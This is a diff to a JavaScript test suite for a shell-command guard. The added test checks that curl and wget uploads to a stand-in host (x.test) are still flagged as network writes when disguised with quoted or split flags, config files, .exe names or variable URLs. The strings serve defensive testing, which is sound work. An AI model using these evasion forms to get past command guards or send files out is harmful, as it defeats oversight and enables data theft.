@@ -155,4 +155,11 @@ describe('S5-4: network writes from a worker shell are guarded', () => {
         assert.equal(decide(execTool('ls -la', os.tmpdir()), { cwd: os.tmpdir() }).allow, true);
         assert.equal(decide(writeTool('/etc/hosts'), { cwd: os.tmpdir() }).allow, false, 'a file write outside the worktree stays denied');
     });
+    test('quoted or split flags, config files and .exe heads are still network writes', async () => {
+        const { networkWrite: nw } = await import(pathToFileURL(LIB).href);
+        for (const c of ['curl "-T" f https://x.test', `curl -s'T' f https://x.test`, 'curl -K cfg https://x.test', 'curl --config cfg https://x.test', 'curl.exe -X POST x.test', 'wget.exe -O f x.test', 'curl $URL']) {
+            assert.equal(nw(c), true, c);
+        }
+        assert.equal(nw('curl -sSL https://x.test'), false, 'a plain GET stays allowed');
+    });
 });
